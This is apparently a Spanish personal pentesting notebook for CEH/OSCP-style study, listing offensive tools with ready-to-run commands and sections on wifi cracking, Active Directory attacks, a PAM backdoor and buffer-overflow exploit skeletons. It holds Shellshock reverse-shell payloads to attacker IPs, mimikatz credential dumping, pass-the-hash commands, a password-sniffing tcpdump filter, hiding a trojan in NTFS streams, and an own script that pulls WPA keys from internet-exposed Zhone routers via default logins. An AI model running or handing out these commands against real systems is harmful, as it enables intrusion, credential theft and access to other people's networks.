# Tools revisadas

miércoles, 07 de febrero de 2018

10:49

**Preparación para examen**

[https://ceh.cagy.org/](https://ceh.cagy.org/)



[https://tryhackme.com/games/koth/join/d80d7c8fe47bd9d72eac99ef](https://tryhackme.com/games/koth/join/d80d7c8fe47bd9d72eac99ef)

**7z2john**

**Necesita compilar esta librería** [https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz](https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz)

**AirNG** -\&gt;Monitorea y sirve para capturar password de routers wifi

**Armitage** -\&gt; versión amistosa/interfaz de Metasploit

**Arpspoof** -\&gt; suplanta el arp. Sirve para hacer _man in the middle_

**Burpsuit** -\&gt; sirve para interceptar el tráfico web y modificarlo antes de procesarlo.

Detener una petición de get y modificar el user agent (ShellShock)

User-Agent:() { :; }; /bin/bash -c &#39;bash -i \&gt;&amp; /dev/tcp/10.0.0.23/80850 0\&gt;&amp;1&#39;

[**CACTUSTORCH**](https://github.com/mdsecactivebreach/CACTUSTORCH) **-\&gt;** FrameWork que permite la generación de archivos word capaces de devolver session reversa de tipo meterpreter.

**Cadaver --\&gt; para conectarse a servicios webdav**

**$cadaver**  **http://\&lt;ip\&gt;/webdav**

1. login to the XAMPP server&#39;s WebDAV folder

- cadaver http://\&lt;REMOTE HOST\&gt;/webdav/
- user: wampp
- pass: xampp

1. upload a file to the webdav folder

- put /tmp/helloworld.txt

1. browse to your uploaded file

- load URL, http://\&lt;REMOTE HOST\&gt;/webdav/helloworld.txt, in browser

_Desde \&lt;_[_http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html_](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)_\&gt;_



**Cewl** -\&gt; (Accent Keyword Extractor) extrae las palabras de una página web y genera un diccionario

cewl \&lt;url\&gt; -d 0 -m 6 -w \&lt;nombre.dic\&gt;

**ShellShock** con curl

curl -H &quot;User-Agent: () { :;}; echo; \&lt;comando\&gt;&quot;[http://hello.com/cgi-bin/\&lt;cualquier](http://hello.com/cgi-bin/%3Ccualquier) ejecutable que se encuentre aquí\&gt;

Ejemplo: /bin/bash -c &quot;bash -i \&gt;&amp; /dev/tcp/10.10.14.74/443 0\&gt;&amp;

CertUtil -\&gt; [https://www.hackingarticles.in/windows-for-pentester-certutil/](https://www.hackingarticles.in/windows-for-pentester-certutil/)

**CUPP** -\&gt; crea diccionario en función de un cuestionario para perfilar. (git clone[https://github.com/Mebus/cupp.git](https://github.com/Mebus/cupp.git))

CURL --\&gt; ver detalle

[**Crunch**](https://underc0de.org/foro/hacking/aprende-a-usar-crunch-paso-a-paso/)-\&gt;crea password para hacer diccionarios

crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something

crunch 8 8 0123456789 | pyrit -r msc-01.cap -i - attack\_passthrough

crunch 6 7 eghotu0134 | perl -ne &#39;print unless /([a-z]).\*\1/&#39; \&gt; wordlist.txt

crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt (genera números de celulares chilenos)

Dig-\&gt;obtiene información de dns (puerto 53) para un dominio particular

dig windcorp.thm any @10.10.78.247

[**Dirb**](http://www.lazarus.com.ve/dirb-es-un-escaner-de-contenido-web-busca-objetos-web-existente-ocultos/)-\&gt; enumera urls disponibles de un dominio, por medio de probar las carpetas más comunes.

dirb http://\&lt;sitio\&gt;/\&lt;path\&gt;; dirb [http://192.168.1.103](http://192.168.1.103/) -X .php

**Dmitry** -\&gt; para obtención de información

dmitry -s -n \&lt;host\&gt;

**DNSenum** -\&gt; enumera información de los servidores DNS

**DNSMap** -\&gt; obtiene información de los DNS

**Dnsmasq** -\&gt;

**Empire** _-\&gt;_ Agente de post-explotación de PowerShell puro basado en comunicaciones criptográficas seguras y una arquitectura flexible.

**Enum4linux -\&gt;** [https://highon.coffee/blog/enum4linux-cheat-sheet/](https://highon.coffee/blog/enum4linux-cheat-sheet/)

**Ettercap** -\&gt;para arpoisoning / MITM1

**Exiftool** -\&gt;extrae y modifica metadatos

**Evil-winrm --\&gt;explota pass the hash**

| | Sudo gem install evil-winrm |
| --- | --- |
|   | evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user AdministratorCrea una shell directamente en el equipo windows.[https://blog.spookysec.net/kerberos-abuse/](https://blog.spookysec.net/kerberos-abuse/) |

**Fcrackzip** -\&gt; para usar fuerza bruta en zips. fcrackzip -v -D -u -p /usr/share/dict/words secret.zip

**Forfiles** (windows)

C:\\&gt;forfiles /P C: /S /M &quot;\*curso\*&quot; -\&gt; busca en el disco todos los archivos que contengan en el nombre curso

**Fluxion** -\&gt;crackear wifi

**File** -\&gt; muestra características del archivo a modo de identificar su tipo. (magic number)

**Find** -\&gt; para encontrar archivos o cadenas de texto.

find / -perm -u=s -type f 2\&gt;/dev/null sirve para encontrar ejecutables que se pueden correr como root

find / -perm -4000 2\&gt;/dev/null lo mismo.

Find /home -type -f -printf &quot;%f\t%p\t%p\t%u\r%g\t%m\n&quot; | column -t para listar todos los archivos de un directorio y sus atributos.

find . -iname &#39;\*config\*&#39; -type f -exec grep -nie &#39;pass.\*=&#39; --color=always /dev/null {} \; --\&gt;para encontrar contraseñas en archivos de configuración

- find . -exec grep foo {} + will show you output like this ./dir/file.py:from foo import bar
- find . -exec grep foo {} \; will show you output like this from foo import bar
- find . -exec grep -l foo {} + will show you output like this ./dir/file.py
- find . -exec grep -l foo {} \; will show you output like this ./dir/file.py

_Desde \&lt;_[_https://unix.stackexchange.com/questions/12902/how-to-run-find-exec_](https://unix.stackexchange.com/questions/12902/how-to-run-find-exec)_\&gt;_



**FTP** -\&gt; para conectarse al puerto 21. En caso de no querer responder al ls, probar poniendo PASS, para pasar al modo passivo

[**Gpg**](https://www.gnupg.org/gph/en/manual/x110.html)-\&gt; encripta y desencripta PGP (no es necesario usar openssl)

**En caso de encontrar \*.pgp y private.asc**

gpg --import private.asc para agregar la llave a la base de datos local. (necesitarás crackear el pass con pgp2john y &quot; hash&quot;

gpg --decrypt algo.pgp y poner la contraseña crackeada

[http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/](http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/)

**Gobuster**

gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://jeff.thm/](http://jeff.thm/) -t 20 --\&gt; para fuzzear virtualhosts

**Grep** revisa el contenido de los archivos

grep &#39;\=$&#39; -\&gt; sirve para encontrar base64 dentro de archivos en CTFs

grep -E &#39;(192.168.0.30|192.168.0.40)&#39; -\&gt; busca de una las dos IPs

grep -w -i &quot;^r....$&quot; /usr/share/wordlists/rockyou.txt -\&gt;palabras de 5 letras que comiencen con r

grep -oP &#39;&quot;.\*?&quot;&#39; -\&gt;muestra el contenido de las comillas dobles

grep -io &quot;[0-9]\{1,2\}&quot; busca números de uno o dos dígitos que contengan del 0 al 9.

grep &#39;c:\\users\\&#39; para evitar el backslash trailing. Es necesario usar comilla simple y doble backslash.

| Flags | Description |
| --- | --- |
| -R | Does a recursive grep search for the files inside the folders(if found in the specified path for pattern search; else grep won&#39;t traverse diretory for searching the pattern you specify) |
| -h | If you&#39;re grepping recursively in a directory, this flag disables the prefixing of filenames in the results. |
| -c | This flag won&#39;t list you the pattern only list an integer value, that how many times the pattern was found in the file/folder. |
| -i | I prefer to use this flag most of the time, this is what specifies grep to search for the PATTERN while IGNORING the case  |
| -l  | will only list the filename instead of pattern found in it. |
| -n | It will list the lines with their line number in the file containing the pattern. |
| -v | This flag prints all the lines that are NOT containing the pattern |
| -E | This flag we already read above... will consider the PATTERN as a regular expression to find the matching strings.  |
| -e | The official documentation says, it can be used to specify multiple patterns and if any string matches with the pattern(s) it will list it. |

_Desde \&lt;_[_https://tryhackme.com/room/linuxmodules_](https://tryhackme.com/room/linuxmodules)_\&gt;_



**Harness** -\&gt; FrameWork para creacion de payload.

**Hash-identifier** -\&gt; para identificar qué cifrado tiene un texto

**Hydra,** [**xhydra**](https://gbhackers.com/online-password-bruteforce-attack-thc-hydra-tool-tutorial/)-\&gt; logueador por fuerza bruta web.

hydra -L \&lt;name.txt\&gt; -P \&lt;pass.txt\&gt; \&lt;ip\&gt; http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=ERROR&quot;

hydra -l admin -P /pass.txt \&lt;ip\&gt; -s 8081 http-post-form &quot;/info/login.html:admin\_Username=^USER^&amp;admin\_Password=^PASS^:submit=logIn\_btn&quot; -V -t 1

o hydra -l admin -P \&lt;passwordlist\&gt; -e ns -V \&lt;targetip\&gt; http-get /

hydra -l root -P /usr/share/wordlists/metasploit/unix\_passwords.txt -t 6 ssh://192.168.1.123

Hydra -e nsr \&lt;ip\&gt; pop3 -l \&lt;user\&gt; -P \&lt;rockyou.txt\&gt; -s \&lt;port\&gt; -V



**John** -\&gt; crackea password

john --wordlist=rockyou.txt \&lt;passfile\&gt; --pot=\&lt;dondequieroquedejelosresultados\&gt;

john file.hash (para crackear el hash de un zip hecho con zip2john) se puede usar el parámetro --incremental para fuerza bruta.

**Macchanger** -\&gt; cambia la mac address

**Macof** -\&gt; para hacer MAC flooding. (en este estado el switch pasa a hacer broadcast (sale de unicast) y con wireshark se puede interceptar el contenido de la comunicación.

macof -i \&lt;interface\&gt; -n \&lt;cantidad de veces\&gt;

**Maltego** -\&gt; permite, a través de un dato cualquiera (cuenta de usuario, dominio, mail, etc.) encontrar información relacionada con este disponible en la web (como redes sociales, subdominios, libretas de direcciones, etc.).

**Medusa** -\&gt; para crackear páginas con .htaccess.

medusa -h[192.168.1.101](http://192.168.1.101/) -u admin -P wordlist.txt -M http -m DIR:/test.php -

**Metasploit** -\&gt; para explotar vulnerabilidades y escanear

**Mimikatz** -\&gt; Mimikatz junto con Windows Credential Editor son capaces de leer de la memoria para obtener las claves en texto plano.

mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit (debe ser ejecutado en una ventana con permisos de administrador)

**NC** o **NetCat** -\&gt; conector de ssh. Sirve para hacer listeners o conexiones a puertos específicos (ver mas detalles abajo)

**Netdiscover** -\&gt; encuentra equipos prendidos en la red.. (si no se le pone parámetros, busca en todos)

[**Nikto**](http://blog.elhacker.net/2016/09/escaner-de-vulnerabilidades-web-nikto2.html)-\&gt; audita servidor en búsqueda de vulnerabilidades conocidas.

Nikto -h \&lt;IP\&gt;

**Nmap** -\&gt; escaneador por excelencia. (ver detalles más abajo)

**nslookup** -\&gt; Para realizar osint a servers de correo

$nslookup

\&gt;set q=txt

\&gt;\&lt;domain\&gt; | para ver SPF

\&gt;selector.\&lt;domain\&gt; | para ver DKIMz

\&gt;\_dmarc.\&lt;domain\&gt; | para ver dmarc

\&gt;exit

**Leafpad** -\&gt; notepad en interfaz gráfica de kali

**Ophcrack** --\&gt;crackea contraseñas con rainbow table

sudo ophcrack-cli -d /mnt/c/z/ophcrack\_xp\_tables -t xp\_special -f hash -o dump -u

**Perl** ejecuta código pl

perl -ne &#39;print unless /([a-z]).\*\1/&#39; dict.txt \&gt; outfile.txt sirve para extraer de un diccionario las palabras que no repiten caracteres

**pth-winexe** Pass the Hash sirve para ejecutar comandos desde un linux sobre un equipo windows comprometido

pth-winexe -U WorkGROUP/Administrator%\&lt;hashntlm\&gt; //\&lt;ipvictima\&gt; \&lt;comandodeseado\&gt; (puede ser cmd.exe)

**Es necesario repertir el último hash. Ejemplo**

![](RackMultipart20210412-4-pcx9xb_html_ba2ea2e0ead1e70a.png)



**Python** -\&gt; para ejecutar .py

python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39; sirve para cargar consola una vez conectado por nc a un servidor.

CTRL +Z

stty raw -echo

fg enter enter

python -m SimpleHTTPServer 80 sirve para levantar un servicio web simple con file dir.

**Proxychains** -\&gt; herramienta de shell que permite, en base a un archivo de configuración con listas de servidores proxy, realizar otras operaciones de red a través de estos equipos, saltando por varios de ellos, no exponiendo al equipo local ni dejando registro directo en él o los equipos objetivo

**psexec.py** -\&gt; sirve para levantar shell en windows desde linux, sabiendo la contraseña.

psexec.py [clk:clk123@10.10.10.1](mailto:clk:clk123@10.10.10.1) cmd.exe

Psexec.py -hashes :\&lt;ntlm/hash\&gt; \&lt;user\&gt;@\&lt;host\&gt; ---\&gt;pass the hash del ntlm

**Rpl** -\&gt; comando que permite reemplazar una cadena de texto por otra en un archivo (rpl \&lt;original\&gt; \&lt;reemplazo\&gt; \&lt;archivo.txt\&gt;)

**Rabin2 –zzz ---\&gt; además de revisar binarios, este comando puede mostrar los strings mejor que STRINGS**

**Searchsploit** -\&gt; Busca en la base de datos de ExploitDB pero descargada en Kali

[**SETH**](https://github.com/SySS-Research/Seth)-\&gt;para hacer Mitm particularmente a RDP

**smbclient -** \&gt; ver detalles

**Smbget**

**Smbget –R smb://10.10.10.172/user$ -U &#39;user&#39;**

**smbmap** -\&gt; sirve para revisar carpetas compartidas en puerto 445.

smbmap -u jpalma -p \&lt;pass\&gt; -d cnt -H mateo.cnt.telsur.cl -r \&lt;path\_optional\&gt;

smbmap -H 10.10.10.100 -A Groups.xml -R Replication -q

lee el archivo groups.xml que estaba en SYSVOL /policies/{2mdsdsd}/MACHINE/Groups/

smbmap -H \&lt;ip\&gt; -r share --\&gt;conecta al smb

smbmap -H \&lt;ip\&gt; --upload \&lt;algo\&gt; \&lt;dirdest/algo\&gt;

smbmap –H 8.8.8.8 -u &#39;null&#39;

**smbserver.py \&lt;nombredelrecurso\&gt; \&lt;directorioacompartir\&gt;**

**Ss (socket statistics)**

[https://neverendingsecurity.wordpress.com/2015/04/13/ss-socket-statistics-commands-cheatsheet/](https://neverendingsecurity.wordpress.com/2015/04/13/ss-socket-statistics-commands-cheatsheet/)

**Ssh**

-o StrictHostKeyChecking=no ---\&gt;evita que pida confirmaciòn

Portforward

ssh -L 80:172.0.0.1:80 root@victima



**Steghide** -\&gt; programa de esteganografía

steghide embed -ef sample.txt -cf image.jpg -sf output.jpg

Steghide extract -sf image.jpg -p \&lt;pass\&gt;

**Stegsnow**

Stegsnow –m secreto infile outfile

Stegsnow –C outfile

![](RackMultipart20210412-4-pcx9xb_html_326d904960aafb43.png)

**Shodan** -\&gt; herramienta que indexa en la Internet todos los equipos conectados IoT, con la descripción del tipo de equipo, servicios expuestos, versiones y demás características relevantes

**Shodanwave** _-\&gt; Permite buscar cámaras ip vía shodan y crackear sus password._

_ **Socat** _ _para pivotear en otra red (o para hacer port forwarding)_

cd /tmp

wget [http://10.10.14.6/socat](http://10.10.14.6/socat) (hay que levantar un servicio web para ofrecerlo)

chmod +x socat

./socat tcp-listen:\&lt;ipquequierousar\&gt;,reuseaddr,fork tcp:\&lt;ip\&gt;:\&lt;ipreal\&gt;

**tcpdump** : mini wireshark

tcpdump -i tun0 icmp

tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i &#39;pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user &#39; --color=auto --line-buffered -B20

**TheHarvester** -\&gt; recopila información (ejecutar en modo sudo, dado que es necesario escribir datos en disco)

[**The LAZY script**](https://github.com/arismelachroinos/lscript) **-\&gt; FrameWork de tareas automatizadas en base a script, muy completo.**

**Tplmap - descubre vulnerabilidades de LFI de java (**[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))

**Tshark** -\&gt; línea de comando de wireshark. Puede mostrar estadísticas de un .pcap

tshark -nnr imadecoy -qz io,phs (estadísticas de jerarquía)

tshark -nnr imadecoy -qz ip\_hosts,tree (estadísticas de tráfico)

Metodología de revisión

$tshark -r \&lt;captured.cap\&gt; ---\&gt;analiza tráfico

$tshark -r \&lt;captured.cap\&gt; -Tjson ---\&gt;muestra todos los campos

$tshark -r \&lt;captured.cap\&gt; -Tfields -e \&lt;campo\&gt; ---\&gt;filtra sólo por un campo ejemplo data.data

$tshark -r \&lt;captured.cap\&gt; -Tfields -e \&lt;campo\&gt; -Y &quot;\&lt;protocolo\&gt;&quot; | xxd -r -p ---\&gt; traduce el contenido de hex a textoplano



**ViMdecript**

[https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py](https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py)

**wget** -\&gt; para descargar webpages.. Puede ser la página principal o el sitio completo.

wget --no-check-certificate[https://140.211.11.121/](https://140.211.11.121/) para descargar páginas donde el certificado está malo.

**Wfuzz** -\&gt; para recorrer(fuzzear) urls con parámetros definidos.

para fuzzear web

wfuzz -w /usr/share/wordlists/dirb/common.txt -u[http://10.10.10.69/sync?FUZZ=ls](http://10.10.10.69/sync?FUZZ=ls) -c --hh 19

para fuzzear login

wfuzz -c -L -t 500 --hh=27136 -w wordlist.txt -d &#39;username=Giovanni@password=FUZZ&#39;[http://10.10.10.153/moodle/login/index.php](http://10.10.10.153/moodle/login/index.php)

-c

-L follow redirect

-t threads

--hh hide characters

-w wordlist

-d data en post

Para fuzear subdominios

wfuzz -w /directory.txt -H &quot;host: FUZZ.host.com&quot; --hc 200 --hw 356 -t 100 \&lt;ip\&gt;

(si encuentras, para luego verlos, hay que agregarlos al archivo /etc/hosts )



**WinRM**

[https://www.hackingarticles.in/winrm-penetration-testing/](https://www.hackingarticles.in/winrm-penetration-testing/)

**wmic** : ejecuta ordenes al sistema windows. (para windows)

wmic volume get driveletter, label | findstr &quot;CLK&quot; --\&gt; identifica en qué unidad está la USB

for /f %d in (&#39;wmic volume get driveletter^, label ^| findstr &quot;CLK&quot;&#39;) do set duck=%d

**Wireshark** -\&gt; sniffer de red

**vp** -\&gt; escaneador de servidores wordpress

wpscan --url \&lt;ip/path\&gt; --enumerate vp

wpscan --url [www.test.local](http://www.test.local/) --wordlist pwd\_dict.txt --username admin

[https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/](https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/)

**wapiti** -\&gt; Analisis de vulnerabilidades web ([http://wapiti.sourceforge.net/](http://wapiti.sourceforge.net/))

Xfreerdp --\&gt;

xfreerdp /u:fela /d:corp /p:&quot;rubenF124&quot; /v:10.10.164.123 /cert-ignore /f

/f fullscreen. Se desconecta con ctrl+alt+enter

**Xsltproc** -\&gt; transforma un export de nmap en un reporte amistoso

xsltproc archivo.xml \&gt;archivo.html

**Xxd** -\&gt; muestra el contenido hexadecimal del un archivo

xxd -r reversa desde un hexadecimal a binario

[**Yersinia**](http://kalilinux.foroactivo.com/t60-tutorial-yersinia-para-kali-linux)-\&gt; FrameWork para ataques a la capa 2, genera starvation del dhcp

**Zip2john** _-\&gt;_ zip2john test.zip \&gt; zip.hashes _(genera hash de un zip para luego crackearlo con john)_



# Cómo salir de una rbash

Friday, June 12, 2020

6:28 PM

via nc

Como salir de una restricted bash

[https://github.com/s1ngl3m4l7/voxdei/blob/master/2020\_hackpack/hell\_game.md](https://github.com/s1ngl3m4l7/voxdei/blob/master/2020_hackpack/hell_game.md)

cat() { while read e; do echo $e; done \&lt; $1 }

Usando ssh

ssh user@host bash





# Scripts didácticos

jueves, 7 de mayo de 2020

14:31

Nmap manual para discovery de red

![](RackMultipart20210412-4-pcx9xb_html_deec4685b6489efa.png)



Cómo capturar el crtl-c en bash para que la aplicación no tenga salida descontrolada

trap ctrl\_c INT

function ctrl\_c(){

echo –e &quot;[!] Saliendo...&quot;

exit 1

}

For en una línea:

for i in $(cat /usr/share/wordlists/rockyou.txt);do steghide extract -sf BAND.JPG -p $i; done

Permite agregar una variable en el comando a modo de FOR line

curl &quot;[https://gdata.youtube.com/feeds/api/users/${line}/subscriptions?v=2&amp;alt=json](https://gdata.youtube.com/feeds/api/users/%24%7Bline%7D/subscriptions?v=2&amp;alt=json)&quot;

#!/bin/bash

for hostname in $(cat dom.txt); do host $hostname | grep &quot;has address&quot; | cut -d &quot; &quot; -f4 | sort -u;done

| Script propio para recuperar contraseñas de equipos zhone que estén publicados en internet# el listado de ips debe estar en un txt en el lugar donde se ejecuta el comando.for i in $(cat purasip.txt);do echo -n $i&quot;:&quot;; curl -m 2 -s [http://user:user@$i/wlsecurity.html](mailto:http://user:user@%24i/wlsecurity.html) | grep &quot;var wpaPskKey&quot; | cut -d\&#39; -f2;done |
| --- |

| Script que lee out\_temp por IP e intenta recuperar credenciales una vez ya logueado al server. (zhone)#!/bin/bashCREDS =$1for IP in $(cat out\_temp|cut -f1 -d&quot; &quot;);do echo &quot;[+] Conectando a $IP ...&quot;; echo -n &quot; [+] Obteniendo SSID: &quot;;SSID=$(curl -su $CREDS [http://$IP/wlsecurity.html|grep](https://teams.microsoft.com/_) --color &quot;value=&#39;0&#39;&quot;|cut -f2 -d&quot;\&gt;&quot;|cut -f1 -d&quot;\&lt;&quot;); echo $SSID echo -n &quot; [+] Obteniendo Password: &quot;; KEY=$(curl -su $CREDS [http://$IP/wlsecurity.html|grep](https://teams.microsoft.com/_) --color &quot;var wpaPskKe &#39;{print $4}&#39;|sed -e &quot;s/&#39;//g&quot; -e &#39;s/;//g&#39;); echo $KEYdone |
| --- |

| #!/bin/bashecho &#39;enter target domain: &#39;read domainif [$domain != &#39;&#39;] then echo &#39;Target domain set to $domain&#39; echo &#39;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*&#39; echo &#39;The Harvester&#39; echo &#39;The Harvester&#39; \&gt; OsinT\_$domain.txt theharvester -d $domain -l 50 -b all -f OsinT\_$domain.html echo &#39;done!&#39; echo &#39;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*&#39; echo &#39;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*&#39; \&gt;\&gt; OsinT\_$domain.txt echo &#39;WhoIs Details&#39; whois $domain \&gt;\&gt; OsinT\_$domain.txt echo &#39;done!&#39; echo &#39;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*&#39; echo &#39;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*&#39; \&gt;\&gt; OsinT\_$domain.txt echo &#39;Searching for txt and pdf files on $domain using Goofile&#39; goofile -d $domain -f txt \&gt;\&gt; OsinT\_$domain.txt goofile -d $domain -f pdf \&gt;\&gt; OsinT\_$domain.txtelse echo &#39;Error! Please enter a domain.&#39;fi |
| --- |

| #!/bin/bashecho &quot;Su IP interna es:&quot;ip a | grep -v &#39;127.0.0.1&#39; | grep -v &#39;scope host&#39; | grep &#39;inet&#39;echo &quot;\*\*\*\*\*\*\*\*\*\*\*\*&quot;echo &#39;enter IP segment to scan: &#39;read segmentecho &quot;las siguientes son hosts vivos&quot;nmap -v -sn $segment | grep -v &#39;host down&#39; | grep &#39;Nmap scan&#39; | cut -d &quot; &quot; -f5 |
| --- |

|   |
| --- |



# Active Directory Attack

martes, 9 de marzo de 2021

10:00

[https://hex-men.tech/tryhackme-attacktivedirectory-report/](https://hex-men.tech/tryhackme-attacktivedirectory-report/)

[Pentesting en entornos Active Directory #1 - Samba Relay, PassTheHash](https://www.youtube.com/watch?v=LLevcaB4qew&amp;list=PLlb2ZjHtNkpg2Mc3mbkdYAhEoqnMGdl2Z)

![](RackMultipart20210412-4-pcx9xb_html_211962bc535496f3.png)



# ADS - Cómo crear archivos invisibles en NTFS

jueves, 7 de mayo de 2020

14:31

Echo &quot;hola&quot; \&gt;\&gt; inocente.txt

Notepad inocente.txt:maligno.txt

Type trojan.exe\&gt;inocente.txt:oculto.exe

Se pueden descubrir con dir /R



# Aircrack- - Cómo crackear la wifi

jueves, 7 de mayo de 2020

14:37

Ifconfig \&lt;int\&gt; down



Iwconfig \&lt;int\&gt; mode monitor



Ifconfig \&lt;int\&gt; up

O simplemente

airmon-ng start \&lt;int\&gt;

para saber si la tarjeta inyecta paquetes.

Aireplay-ng -9 \&lt;i\&gt;

Airodump-ng -c \&lt;channel\&gt; -w \&lt;filedump\&gt; --bssid \&lt;mac\&gt; \&lt;int\&gt;

Aquí mostra en #/s la cantidad de reconexiones, dejar corriendo

Aireplay-ng -0 0 -a \&lt;mac\&gt; \&lt;int\&gt;

es conveniente ejecutar un macchanger antes de este paso, dado que en log aparece registrado el Deauth

Crea la autentificación después de unos minutos se puede cancelar para permitir a los dispositivos autenticarse de nuevo.

En la ventana de airodump se verá arriba WPA handshake \&lt;mac\&gt; que significa que ya capturó la autentificación

Además se debe tomar nota de la mac con que se hizo la autentificación ( en la misma ventana de airdump, en station)

Finalmente

Aircrack-ng -w \&lt;filedump\&gt; -e \&lt;bssid o nombre\&gt;



---

Para extraer la contraseña de un .cap y así poder leerlo decifrado en wireshark

aircrack-ng -w \&lt;wordlist\&gt; \&lt;pcapfile.cap\&gt;

Luego abrir el cap en wireshark, ir a Editar, Preferencias, protocolos, seleccionar IEE 802.11

En Decryption keys presionar en Edit

Presionar en +

Seleccionar wpa-pwd y agregar la password extraida de aircrack-ng

---

Para acelerar el proceso de cracking, es posible hacer preprocesado de contraseñas

airlib-ng \&lt;nuevonombre\&gt; --import passwd \&lt;dict\&gt;

airlib-ng \&lt;mismonombre\&gt; --import essid \&lt;essid.lst\&gt;

airlib-ng \&lt;mismonombre\&gt; --clean all

airlib-ng \&lt;mismonombre\&gt; --batch

aircrack-ng -r \&lt;mismonombre\&gt; \&lt;archivo.pcap con handshake\&gt;

------------

teniendo la contraseña ya se puede desencriptar un pcap de tráfico

airdecap-ng -e \&lt;essid\&gt; -p \&lt;password\&gt; \&lt;archivo.pcap\&gt;

creará un archivo-dec.pcap que podrá analizarse para ver el tráfico

tshark -r archivo-dec.cap -Y &quot;http&quot; 2\&gt;/dev/null

tshark -r archivo-dec.cap -Tfields -e tcp.payload 2\&gt;/dev/null

tshark -r archivo-dec.cap -Tfields -e data.data 2\&gt;/dev/null



WPA Cracking via HCCAP

./cap2hccap.bin /path/to/my.cap my.hccap

./hccap2john ./my.hccap \&gt;crackme

john --wordlist=rockyou-10.txt --format=wpapsk crackme

_Desde \&lt;_[_https://charlesreid1.com/wiki/John\_the\_Ripper/WPA_](https://charlesreid1.com/wiki/John_the_Ripper/WPA)_\&gt;_







# Backdoor - pam\_unix.so

martes, 2 de marzo de 2021

16:07

[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

If you don&#39;t know what is the file &quot;pam\_unix.so&quot;, well, it simply is one of many files in Linux that is responsible for authentication.

![](RackMultipart20210412-4-pcx9xb_html_6f132fc1c0e5967.png)

As seen here, the file &quot;pam\_unix.so&quot; uses the &quot;unix\_verify\_password&quot; function to verify to user&#39;s supplied password.

Now let&#39;s look at this screenshot:

![](RackMultipart20210412-4-pcx9xb_html_84ac7c1467797935.png)

We can see that we added a new line to our code : &quot;if (strcmp(p, &quot;0xMitsurugi&quot;) != 0 )&quot;

_Desde \&lt;_[_https://tryhackme.com/room/linuxbackdoors_](https://tryhackme.com/room/linuxbackdoors)_\&gt;_





# Banner Grabbing - Cómo obtener información del servidor web

jueves, 7 de mayo de 2020

14:37

Nc \&lt;ip\&gt;:80

GET / /HTTP 1.0

or

echo GET / /HTTP 1.0 | Nc \&lt;ip\&gt;:80



# Bypass 403 - Im Joker

sábado, 27 de febrero de 2021

22:19

[https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403)

Otra similar

[https://github.com/lobuhi/byp4xx](https://github.com/lobuhi/byp4xx)



# **Buffer Overflow**

domingo, 12 de julio de 2020

19:54

[https://www.thecybermentor.com/buffer-overflows-made-easy](https://www.thecybermentor.com/buffer-overflows-made-easy)

![](RackMultipart20210412-4-pcx9xb_html_5ed864be1f166ab4.png)

[Buffer Overflow en Windows 32 bits - Desarrollo de un exploit con MiniShare 1.4.1](https://www.youtube.com/watch?v=PQJn4s4E8Os)

![](RackMultipart20210412-4-pcx9xb_html_e126800ceb361078.png)

/\*\*\* En OSCP nos darán la estructura del PoC, donde además nos indicarán la variable a explotar. \*\*\*\*\

/\*\* CesarFTP 0.99g \*\*\



**fuzzer.py**

| 123456789101112131415161718192021222324 | #!/usr/bin/pythonimport sys, socket direccion = &#39;127.0.0.1&#39;puerto = 9999buffer = [&#39;A&#39;]contador = 100 while len(buffer) \&lt;= 10:    buffer.append(&#39;A&#39;\*contador)    contador = contador + 100try:    for cadena in buffer:        print &#39;[+] Enviando %s bytes...&#39; % len(cadena)        s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)        s.connect((direccion, puerto))        s.send(cadena + &#39;\r\n&#39;)        s.recv(1024)        print &#39;[+] Listo&#39;except:    print &#39;[!] No se puede conectar al programa. Puede que lo hayas crasheado.&#39;    sys.exit(0)finally:    s.close() |
| --- | --- |

**bof.py**

| 123456789101112131415161718 | #!/usr/bin/python import sys, socket metodo\_http = &quot;GET &quot;cabecera\_http = &quot; HTTP/1.1\r\n\r\n&quot;direccion = &#39;127.0.0.1&#39;puerto = 9999buffer = #Definir buffer try:    print &#39;[+] Enviando buffer&#39;    s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)s.connect((direccion, puerto))s.send(metodo\_http+buffer+cabecera\_http)s.recv(1024)            except:    print &#39;[!] No se puede conectar al programa.&#39;    sys.exit(0)finally:    s.close() |
| --- | --- |

